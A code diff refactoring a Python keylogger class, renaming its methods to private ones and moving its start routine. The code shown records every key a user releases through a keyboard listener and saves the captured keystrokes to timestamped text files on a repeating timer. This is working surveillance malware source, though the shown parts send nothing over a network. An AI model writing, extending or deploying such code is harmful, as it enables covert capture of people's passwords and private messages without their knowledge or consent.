@@ -10,9 +10,19 @@ class Keylogger:
         self.onlyOneFile = onlyOneFile
         self.startDatetime = datetime.now()
         self.endDatetime = datetime.now()
-        self.updateFilename()
+        self._updateFilename()
+    
+    def start(self) -> None:
+        self.startDatetime = datetime.now()
+        # Start the keylogger
+        # Start reporting the keylogs
+        self._report()
+        # Make a simple message
+        print(f"{datetime.now()} - Started keylogger")
+        with Listener(on_release=self._callback) as listener:
+            listener.join()
 
-    def callback(self, key : Key) -> None:
+    def _callback(self, key : Key) -> None:
         """
             This callback is invoked whenever a keyboard event is occured
         """
@@ -27,7 +37,7 @@ class Keylogger:
         else:
             self.log += str(key).replace("'","")
 
-    def report(self) -> None:
+    def _report(self) -> None:
         """
             This function gets called every `self.interval`
             It basically sends keylogs and resets `self.log` variable
@@ -37,19 +47,19 @@ class Keylogger:
             self.endDatetime = datetime.now()
             
             if not self.onlyOneFile:
-                self.updateFilename()
+                self._updateFilename()
 
             if self.reportMethod == "file":
-                self.reportToFile()
+                self._reportToFile()
             print(f"[{self.fileName}] - {self.log}")
             self.startDatetime = datetime.now()
         
         self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
+        timer = Timer(interval=self.interval, function=self._report)
         timer.daemon = True
         timer.start()
 
-    def reportToFile(self) -> None:
+    def _reportToFile(self) -> None:
         """
             This method creates a log file in the current directory that contains
             the current keylogs in the `self.log` variable
@@ -62,17 +72,7 @@ class Keylogger:
             print(self.log, file=f)
         print(f"[+] Saved {self.fileName}.txt")
 
-    def start(self) -> None:
-        self.startDatetime = datetime.now()
-        # Start the keylogger
-        # Start reporting the keylogs
-        self.report()
-        # Make a simple message
-        print(f"{datetime.now()} - Started keylogger")
-        with Listener(on_release=self.callback) as listener:
-            listener.join()
-
-    def updateFilename(self) -> None:
+    def _updateFilename(self) -> None:
         """
             Construct the filename to be identified by start & end datetimes
         """
